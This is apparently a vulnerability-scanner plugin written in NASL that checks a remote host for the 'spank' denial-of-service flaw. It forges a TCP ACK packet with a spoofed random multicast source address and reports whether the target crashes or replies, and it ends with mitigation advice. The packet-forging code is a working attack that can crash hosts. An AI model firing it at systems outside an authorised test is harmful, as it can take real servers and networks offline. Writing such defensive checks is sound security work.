# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11901");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("'spank' Denial of Service Vulnerability");
  # Some IP stacks are crashed by this attack
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("global_settings.nasl");
  script_exclude_keys("keys/islocalhost", "keys/TARGET_IS_IPV6");

  script_tag(name:"summary", value:"The remote host answers to TCP packets that are coming from a multicast
  address. This is known as the 'spank' denial of service attack.");

  script_tag(name:"solution", value:"Contact your operating system vendor for a patch.
  Filter out multicast addresses (224.0.0.0/4).");

  script_tag(name:"impact", value:"An attacker might use this flaw to shut down this server and
  saturate your network, thus preventing you from working properly.
  This also could be used to run stealth scans against your machine.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_probe");

  exit(0);
}

if( islocalhost() ) exit( 0 );
if( TARGET_IS_IPV6() ) exit( 0 );

start_denial();
alive = end_denial();
if( ! alive ) exit( 0 );

dest = get_host_ip();

a = 224 +  rand() % 16;
b = rand() % 256;
c = rand() % 256;
d = rand() % 256;
src = strcat( a, ".", b, ".", c, ".", d );

m = join_multicast_group( src );
if( ! m && ! islocalnet() ) exit( 0 );
# Either we need to upgrade libnasl, or multicast is not
# supported on this host / network
# If we are on the same network, the script may work, otherwise, the chances
# are very small -- only if we are on the way to the default multicast
# gateway

start_denial();

id = rand() % 65536;
seq = rand();
ack = rand();

sport = rand() % 65535 + 1;
dport = rand() % 65535 + 1;

ip = forge_ip_packet( ip_v:4, ip_hl:5, ip_tos:0x08, ip_len:20,
                      ip_id:id, ip_p:IPPROTO_TCP, ip_ttl:255,
                      ip_off:0, ip_src:src );

tcpip = forge_tcp_packet( ip:ip, th_sport:sport, th_dport:dport,
                          th_flags:TH_ACK, th_seq:seq, th_ack:0,
                          th_x2:0, th_off:5,  th_win:2048, th_urp:0 );

# We could use a better pcap filter to avoid a false positive...
pf = strcat( "src host ", dest, " and dst host ", src );
ok = FALSE;
for( i = 0; i < 3 && ! ok; i++ ) {
  r = send_packet( tcpip, pcap_active:TRUE, pcap_filter:pf );
  if( r ) ok = TRUE;
}

alive = end_denial();
if( ! alive ) {
  report = "The remote host crashed when it received a TCP packet that were coming
  from a multicast address. This is known as the 'spank' denial of service attack.";
  security_message( port:0, proto:"tcp", data:report );
  set_kb_item( name:"Host/dead", value:TRUE );
} else if( ok ) {
  report = "The remote host didn't crashed but answered to TCP packets that are coming from a multicast address.";
  security_message( port:0, proto:"tcp", data:report );
  exit( 0 );
}

exit( 99 );